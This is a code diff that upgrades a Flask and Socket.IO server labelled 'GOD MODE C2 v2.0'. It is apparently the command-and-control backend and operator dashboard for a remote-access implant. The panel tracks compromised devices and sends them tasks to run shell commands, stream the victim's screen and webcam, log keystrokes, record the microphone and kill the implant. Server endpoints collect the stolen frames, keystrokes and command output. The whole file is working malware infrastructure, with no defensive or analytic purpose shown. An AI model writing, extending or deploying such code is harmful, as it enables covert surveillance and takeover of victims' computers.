@@ -2,147 +2,304 @@ from flask import Flask, render_template_string, request, jsonify
 from flask_socketio import SocketIO, emit
 from flask_cors import CORS
 import json
-import sqlite3
 from datetime import datetime
 import base64
-from PIL import Image
-import io
 import threading
 import time
-import psutil
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'godmode-secret'
+app.config['SECRET_KEY'] = 'godmode-v2'
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 CORS(app)
 
-# In-memory storage (Render doesn't persist)
 devices = {}
 tasks = {}
-telemetry_history = {}
+last_seen = {}
 
-HTML_TEMPLATE = """
+MODERN_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>GOD MODE C2 - 660ae05c5de1c871</title>
+    <title>GOD MODE C2 v2.0</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #1a1a2e;
+            --accent: #00d4ff;
+            --accent-glow: #00d4ff80;
+            --success: #00ff88;
+            --danger: #ff4757;
+            --warning: #ffa502;
+            --text-primary: #ffffff;
+            --text-secondary: #b8b8b8;
+            --glass: rgba(255,255,255,0.05);
+        }
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { 
-            background: #0a0a0a; 
-            color: #00ff88; 
-            font-family: 'Courier New', monospace; 
+        body {
+            background: linear-gradient(135deg, var(--bg-primary) 0%, #16213e 50%, #0f0f23 100%);
+            color: var(--text-primary);
+            font-family: 'Orbitron', monospace;
+            height: 100vh;
             overflow: hidden;
-        }
-        .header { 
-            background: linear-gradient(90deg, #ff0080, #00ff88); 
-            padding: 20px; 
-            text-align: center;
-            box-shadow: 0 0 30px #00ff88;
-        }
-        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; padding: 20px; height: calc(100vh - 100px); }
-        .panel { 
-            background: rgba(0,255,136,0.1); 
-            border: 1px solid #00ff88; 
-            border-radius: 10px; 
-            padding: 15px; 
-            overflow: auto;
             position: relative;
         }
-        .panel h3 { color: #ff0080; margin-bottom: 10px; }
-        .device-list { max-height: 200px; }
-        .terminal { 
-            background: #000; 
-            color: #00ff00; 
-            padding: 10px; 
-            font-size: 12px; 
-            height: 300px; 
-            overflow-y: scroll;
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 80%, var(--accent-glow) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, var(--success)20 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, var(--danger)10 0%, transparent 30%);
+            z-index: -1;
+            animation: pulse 4s ease-in-out infinite alternate;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.4; }
+            100% { opacity: 0.8; }
+        }
+        
+        .header {
+            background: rgba(10,10,10,0.9);
+            backdrop-filter: blur(20px);
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid var(--accent-glow);
+            box-shadow: 0 8px 32px rgba(0,212,255,0.1);
+        }
+        .header h1 {
+            font-size: 2.5em;
+            background: linear-gradient(45deg, var(--accent), var(--success));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px var(--accent-glow);
+            margin-bottom: 10px;
+        }
+        
+        .dashboard {
+            display: grid;
+            grid-template-columns: 300px 1fr 400px;
+            grid-template-rows: 1fr;
+            gap: 20px;
+            padding: 20px;
+            height: calc(100vh - 120px);
+        }
+        
+        .glass-panel {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--accent-glow);
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        .glass-panel::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--accent), transparent);
+        }
+        
+        .devices-panel h3, .controls-panel h3, .streams-panel h3 {
+            color: var(--accent);
+            margin-bottom: 20px;
+            font-size: 1.2em;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .device-item {
+            background: rgba(255,255,255,0.03);
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 1px solid transparent;
+        }
+        .device-item:hover, .device-item.active {
+            border-color: var(--accent);
+            box-shadow: 0 0 20px var(--accent-glow);
+            background: rgba(0,212,255,0.1);
+        }
+        .device-id { font-size: 0.9em; opacity: 0.8; }
+        .device-status { font-size: 0.75em; margin-top: 5px; }
+        .online { color: var(--success); }
+        .offline { color: var(--danger); }
+        
+        .live-video {
+            width: 100%;
+            height: 250px;
+            background: #000;
+            border-radius: 12px;
+            border: 2px solid var(--accent-glow);
+            margin-bottom: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        .video-status {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.7);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.8em;
+        }
+        
+        .terminal {
+            background: #000;
+            color: var(--success);
+            padding: 15px;
+            height: 200px;
+            border-radius: 12px;
+            font-size: 0.85em;
+            overflow-y: auto;
             white-space: pre-wrap;
+            border: 1px solid var(--success);
         }
-        .live-video { 
-            width: 100%; 
-            height: 200px; 
-            background: #111; 
-            border: 2px solid #00ff88; 
-            border-radius: 5px;
+        
+        .control-group {
+            margin-bottom: 15px;
         }
-        button { 
-            background: linear-gradient(45deg, #ff0080, #00ff88); 
-            border: none; 
-            color: white; 
-            padding: 10px 15px; 
-            border-radius: 5px; 
-            cursor: pointer; 
-            margin: 5px;
+        .control-group input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--accent-glow);
+            border-radius: 10px;
+            color: var(--text-primary);
             font-family: inherit;
+            margin-bottom: 10px;
         }
-        button:hover { box-shadow: 0 0 20px #00ff88; }
-        input { 
-            background: #111; 
-            border: 1px solid #00ff88; 
-            color: #00ff88; 
-            padding: 8px; 
-            border-radius: 5px; 
-            width: 200px;
+        .btn {
+            background: linear-gradient(45deg, var(--accent), var(--success));
+            border: none;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            width: 100%;
+            margin-bottom: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0,212,255,0.3);
         }
-        .status { position: absolute; top: 5px; right: 10px; font-size: 12px; }
-        .online { color: #00ff88; }
-        .offline { color: #ff4444; }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0,212,255,0.5);
+        }
+        .btn.danger { background: linear-gradient(45deg, var(--danger), #ff6b7a); }
+        
+        .keys-log, .audio-log {
+            height: 150px;
+            background: #000;
+            border-radius: 12px;
+            padding: 15px;
+            font-size: 0.8em;
+            overflow-y: auto;
+            border: 1px solid var(--accent-glow);
+            margin-bottom: 10px;
+        }
+        
+        .telemetry-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            font-size: 0.9em;
+        }
+        .metric {
+            background: rgba(255,255,255,0.03);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .metric-value { font-size: 1.5em; font-weight: bold; }
+        
+        @media (max-width: 1200px) {
+            .dashboard { grid-template-columns: 1fr; grid-template-rows: auto auto auto; }
+        }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>🐱 GOD MODE C2 - LIVE CONTROL</h1>
-        <div id="device-status"></div>
+        <h1>🐱 GOD MODE C2 v2.0</h1>
+        <div id="selected-device" style="font-size: 1.1em; opacity: 0.8;"></div>
     </div>
     
-    <div class="grid">
-        <div class="panel">
-            <h3>📡 DEVICE STATUS</h3>
-            <div id="devices" class="device-list"></div>
-            <div style="margin-top: 10px;">
-                <input id="cmd-input" placeholder="Enter command..." />
-                <button onclick="sendCmd()">▶️ EXECUTE</button>
-                <br>
-                <button onclick="startScreen()">📺 SCREEN STREAM</button>
-                <button onclick="startWebcam()">📹 WEBCAM</button>
-                <button onclick="startKeylog()">⌨️ KEYLOG</button>
-                <button onclick="startMic()">🎤 MIC</button>
+    <div class="dashboard">
+        <div class="glass-panel">
+            <h3>📡 DEVICES</h3>
+            <div id="devices-list"></div>
+        </div>
+        
+        <div class="glass-panel">
+            <h3>🎬 LIVE STREAMS</h3>
+            <div class="live-video" id="screen-stream">
+                <div class="video-status" id="screen-status">SCREEN OFFLINE</div>
+            </div>
+            <div class="live-video" id="webcam-stream">
+                <div class="video-status" id="webcam-status">WEBCAM OFFLINE</div>
             </div>
         </div>
         
-        <div class="panel">
-            <h3>📺 LIVE SCREEN</h3>
-            <div class="live-video" id="screen-stream"></div>
-            <div class="status" id="screen-status">OFFLINE</div>
+        <div class="glass-panel">
+            <h3>⚡ CONTROLS</h3>
+            <div class="control-group">
+                <input id="command-input" placeholder="Enter shell command..." />
+                <button class="btn" onclick="executeCommand()">▶️ RUN COMMAND</button>
+            </div>
+            <div class="control-group">
+                <button class="btn" onclick="toggleScreenStream()">📺 TOGGLE SCREEN</button>
+                <button class="btn" onclick="toggleWebcam()">📹 TOGGLE WEBCAM</button>
+            </div>
+            <div class="control-group">
+                <button class="btn" onclick="toggleKeylogger()">⌨️ KEYLOGGER</button>
+                <button class="btn" onclick="toggleMicrophone()">🎤 MICROPHONE</button>
+            </div>
+            <div class="control-group">
+                <button class="btn danger" onclick="killDevice()">💀 KILL IMPLANT</button>
+            </div>
         </div>
         
-        <div class="panel">
-            <h3>📡 TERMINAL</h3>
-            <div class="terminal" id="terminal"></div>
+        <div class="glass-panel">
+            <h3>📱 TERMINAL</h3>
+            <div class="terminal" id="terminal-output"></div>
         </div>
         
-        <div class="panel">
-            <h3>📹 WEBCAM</h3>
-            <div class="live-video" id="webcam-stream"></div>
-            <div class="status" id="webcam-status">OFFLINE</div>
+        <div class="glass-panel">
+            <h3>⌨️ KEYLOGGER</h3>
+            <div class="keys-log" id="keylog"></div>
         </div>
         
-        <div class="panel">
-            <h3>⌨️ KEYS</h3>
-            <div id="keys" style="height: 200px; overflow-y: scroll; background: #000; padding: 10px; font-family: monospace;"></div>
-        </div>
-        
-        <div class="panel">
-            <h3>🎤 AUDIO</h3>
-            <div id="audio-status" style="height: 200px; background: #000; padding: 10px;"></div>
-        </div>
-        
-        <div class="panel">
+        <div class="glass-panel">
             <h3>📊 TELEMETRY</h3>
-            <div id="telemetry"></div>
+            <div class="telemetry-grid">
+                <div class="metric">
+                    <div class="metric-value" id="cpu">--</div>
+                    <div>CPU</div>
+                </div>
+                <div class="metric">
+                    <div class="metric-value" id="ram">--</div>
+                    <div>RAM</div>
+                </div>
+                <div class="metric">
+                    <div class="metric-value" id="ip">--</div>
+                    <div>IP</div>
+                </div>
+                <div class="metric">
+                    <div class="metric-value" id="last-seen">--</div>
+                    <div>LAST SEEN</div>
+                </div>
+            </div>
         </div>
     </div>
 
@@ -150,23 +307,20 @@ HTML_TEMPLATE = """
         const socket = io();
         let currentDevice = null;
         
-        socket.on('connect', () => {
-            console.log('🔥 C2 CONNECTED');
-        });
+        socket.on('connect', () => console.log('🔥 C2 v2.0 CONNECTED'));
         
         socket.on('telemetry', (data) => {
             devices[data.id] = data;
+            last_seen[data.id] = Date.now();
+            if (data.id === currentDevice) updateTelemetry(data);
             updateDevices();
-            document.getElementById('telemetry').innerHTML = 
-                `CPU: ${data.cpu}% | RAM: ${data.ram}% | IP: ${data.ip}`;
         });
         
         socket.on('screen_frame', (data) => {
             if (data.id === currentDevice) {
                 document.getElementById('screen-stream').innerHTML = 
                     `<img src="data:image/jpeg;base64,${data.frame}" style="width:100%;height:100%;object-fit:cover;">`;
-                document.getElementById('screen-status').textContent = '🟢 LIVE 8FPS';
-                document.getElementById('screen-status').className = 'status online';
+                document.getElementById('screen-status').textContent = `🟢 LIVE (${new Date().toLocaleTimeString()})`;
             }
         });
         
@@ -174,96 +328,90 @@ HTML_TEMPLATE = """
             if (data.id === currentDevice) {
                 document.getElementById('webcam-stream').innerHTML = 
                     `<img src="data:image/jpeg;base64,${data.frame}" style="width:100%;height:100%;object-fit:cover;">`;
-                document.getElementById('webcam-status').textContent = '🟢 LIVE';
-                document.getElementById('webcam-status').className = 'status online';
+                document.getElementById('webcam-status').textContent = `🟢 LIVE`;
             }
         });
         
         socket.on('keys', (data) => {
             if (data.id === currentDevice) {
-                document.getElementById('keys').innerHTML += data.keys + ' ';
-                document.getElementById('keys').scrollTop = document.getElementById('keys').scrollHeight;
+                document.getElementById('keylog').textContent += data.keys + ' ';
+                document.getElementById('keylog').scrollTop = document.getElementById('keylog').scrollHeight;
             }
         });
         
         socket.on('result', (data) => {
             if (data.id === currentDevice) {
-                const term = document.getElementById('terminal');
-                term.innerHTML += `[${new Date().toLocaleTimeString()}] ${JSON.stringify(data.result, null, 2)}\n`;
+                const term = document.getElementById('terminal-output');
+                const ts = new Date().toLocaleTimeString();
+                term.textContent += `[${ts}] ${JSON.stringify(data.result, null, 2)}\\n`;
                 term.scrollTop = term.scrollHeight;
             }
         });
         
         function updateDevices() {
-            const devList = document.getElementById('devices');
-            devList.innerHTML = Object.entries(devices)
-                .map(([id, dev]) => 
-                    `<div style="cursor:pointer;padding:5px;border-bottom:1px solid #333;" 
-                         onclick="selectDevice('${id}')">
-                        🟢 ${id} - ${dev.host} (${dev.user})<br>
-                        <small>${dev.os} | CPU:${dev.cpu}% RAM:${dev.ram}%</small>
-                    </div>`
-                ).join('');
+            const list = document.getElementById('devices-list');
+            list.innerHTML = Object.entries(devices).map(([id, dev]) => {
+                const now = Date.now();
+                const isOnline = (now - (last_seen[id] || 0)) < 10000;
+                return `
+                    <div class="device-item ${id === currentDevice ? 'active' : ''}" onclick="selectDevice('${id}')">
+                        <div><strong>${id}</strong></div>
+                        <div class="device-id">${dev.host || 'Unknown'} / ${dev.user || 'n/a'}</div>
+                        <div class="device-status ${isOnline ? 'online' : 'offline'}">
+                            ${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'} 
+                            CPU: ${dev.cpu || 0}% RAM: ${dev.ram || 0}%
+                        </div>
+                    </div>
+                `;
+            }).join('');
         }
         
         function selectDevice(id) {
             currentDevice = id;
-            document.getElementById('device-status').innerHTML = `🎯 SELECTED: ${id}`;
+            document.getElementById('selected-device').textContent = `🎯 TARGET: ${id}`;
+            updateDevices();
         }
         
-        function sendCmd() {
-            const cmd = document.getElementById('cmd-input').value;
+        function updateTelemetry(data) {
+            document.getElementById('cpu').textContent = data.cpu + '%';
+            document.getElementById('ram').textContent = data.ram + '%';
+            document.getElementById('ip').textContent = data.ip || 'N/A';
+            document.getElementById('last-seen').textContent = new Date().toLocaleTimeString();
+        }
+        
+        function executeCommand() {
+            const cmd = document.getElementById('command-input').value;
             if (currentDevice && cmd) {
-                socket.emit('task', {
-                    id: currentDevice,
-                    type: 'shell',
-                    cmd: cmd
-                });
-                document.getElementById('cmd-input').value = '';
+                socket.emit('task', {id: currentDevice, type: 'shell', cmd: cmd});
+                document.getElementById('command-input').value = '';
             }
         }
         
-        function startScreen() {
-            if (currentDevice) {
-                socket.emit('task', {
-                    id: currentDevice,
-                    type: 'stream_screen'
-                });
-            }
+        function toggleScreenStream() {
+            socket.emit('task', {id: currentDevice, type: 'stream_screen'});
         }
         
-        function startWebcam() {
-            if (currentDevice) {
-                socket.emit('task', {
-                    id: currentDevice,
-                    type: 'stream_webcam'
-                });
-            }
+        function toggleWebcam() {
+            socket.emit('task', {id: currentDevice, type: 'stream_webcam'});
         }
         
-        function startKeylog() {
-            if (currentDevice) {
-                socket.emit('task', {
-                    id: currentDevice,
-                    type: 'keylog_start'
-                });
-            }
+        function toggleKeylogger() {
+            socket.emit('task', {id: currentDevice, type: 'keylog_start'});
         }
         
-        function startMic() {
-            if (currentDevice) {
-                socket.emit('task', {
-                    id: currentDevice,
-                    type: 'mic_start'
-                });
-            }
+        function toggleMicrophone() {
+            socket.emit('task', {id: currentDevice, type: 'mic_start'});
         }
         
-        document.getElementById('cmd-input').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendCmd();
-        });
+        function killDevice() {
+            socket.emit('task', {id: currentDevice, type: 'kill'});
+        }
         
+        // Auto refresh
         setInterval(updateDevices, 2000);
+        document.getElementById('command-input').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') executeCommand();
+        });
     </script>
 </body>
 </html>
@@ -271,7 +419,7 @@ HTML_TEMPLATE = """
 
 @app.route('/')
 def index():
-    return render_template_string(HTML_TEMPLATE)
+    return render_template_string(MODERN_HTML)
 
 @app.route('/tasks/<device_id>')
 def get_tasks(device_id):
@@ -279,49 +427,60 @@ def get_tasks(device_id):
 
 @app.route('/telemetry', methods=['POST'])
 def telemetry():
-    data = request.json
-    device_id = data['id']
-    devices[device_id] = data
-    socketio.emit('telemetry', data)
-    return jsonify({'status': 'ok'})
+    try:
+        data = request.json
+        device_id = data.get('id')
+        if device_id:
+            devices[device_id] = data
+            socketio.emit('telemetry', data)
+        return jsonify({'status': 'ok'})
+    except:
+        return jsonify({'status': 'error'})
 
 @app.route('/result', methods=['POST'])
 def result():
-    data = request.json
-    socketio.emit('result', data)
-    return jsonify({'status': 'ok'})
+    try:
+        data = request.json
+        socketio.emit('result', data)
+        return jsonify({'status': 'ok'})
+    except:
+        return jsonify({'status': 'error'})
 
 @app.route('/stream/screen', methods=['POST'])
 def screen_stream():
-    data = request.json
-    socketio.emit('screen_frame', data)
-    return jsonify({'status': 'ok'})
+    try:
+        data = request.json
+        socketio.emit('screen_frame', data)
+        return jsonify({'status': 'ok'})
+    except:
+        return jsonify({'status': 'error'})
 
 @app.route('/stream/webcam', methods=['POST'])
 def webcam_stream():
-    data = request.json
-    socketio.emit('webcam_frame', data)
-    return jsonify({'status': 'ok'})
+    try:
+        data = request.json
+        socketio.emit('webcam_frame', data)
+        return jsonify({'status': 'ok'})
+    except:
+        return jsonify({'status': 'error'})
 
 @app.route('/keys', methods=['POST'])
 def keys():
-    data = request.json
-    socketio.emit('keys', data)
-    return jsonify({'status': 'ok'})
-
-@app.route('/stream/audio', methods=['POST'])
-def audio_stream():
-    data = request.json
-    socketio.emit('audio_data', data)
-    return jsonify({'status': 'ok'})
+    try:
+        data = request.json
+        socketio.emit('keys', data)
+        return jsonify({'status': 'ok'})
+    except:
+        return jsonify({'status': 'error'})
 
 @socketio.on('task')
 def handle_task(data):
-    device_id = data['id']
-    if device_id not in tasks:
-        tasks[device_id] = []
-    tasks[device_id].append(data)
-    emit('task_sent', {'status': 'sent'})
+    device_id = data.get('id')
+    if device_id and device_id in devices:
+        if device_id not in tasks:
+            tasks[device_id] = []
+        tasks[device_id].append(data)
+        emit('task_sent', {'status': 'sent'})
 
 if __name__ == '__main__':
-    socketio.run(app, host='0.0.0.0', port=5000, debug=False)
+    socketio.run(app, host='0.0.0.0', port=5000)
